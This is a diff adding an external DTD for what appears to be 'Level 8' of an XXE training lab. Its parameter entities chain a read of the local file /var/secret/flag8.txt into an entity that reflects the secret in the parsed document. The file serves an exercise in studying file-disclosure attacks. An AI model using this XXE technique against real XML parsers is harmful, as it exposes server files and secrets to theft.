@@ -1,0 +1,6 @@
+<!-- chain.dtd — external DTD for Level 8 (parameter-entity chaining).
+     %f1 reads the secret; %f2 builds a general entity `chained` carrying that
+     content; referencing &chained; in the document body reflects the secret. -->
+<!ENTITY % f1 SYSTEM "file:///var/secret/flag8.txt">
+<!ENTITY % f2 "<!ENTITY chained '%f1;'>">
+%f2;
